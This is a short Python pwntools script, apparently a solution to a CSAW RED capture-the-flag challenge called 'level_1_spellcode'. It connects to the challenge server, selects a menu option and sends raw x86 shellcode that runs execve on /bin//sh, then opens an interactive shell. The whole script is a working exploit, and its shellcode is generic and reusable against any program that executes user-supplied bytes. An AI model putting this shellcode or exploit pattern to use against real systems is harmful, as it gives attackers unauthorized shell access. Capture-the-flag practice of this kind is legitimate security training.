from pwn import *

REMOTE = True
GDB = False

BINARY = './level_1_spellcode'

SHELLCODE = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# context(terminal=['tmux','new-window'])

if REMOTE:
    p = remote('pwn.red.csaw.io', 5000)
elif GDB:
    p = gdb.debug(BINARY, 'b main')
else:
    p = process(BINARY)

p.recvuntil("Custom")
p.sendline("6")
p.recvuntil("Enter your spell code (up to 60 bytes): >")
p.sendline(SHELLCODE)
p.interactive()
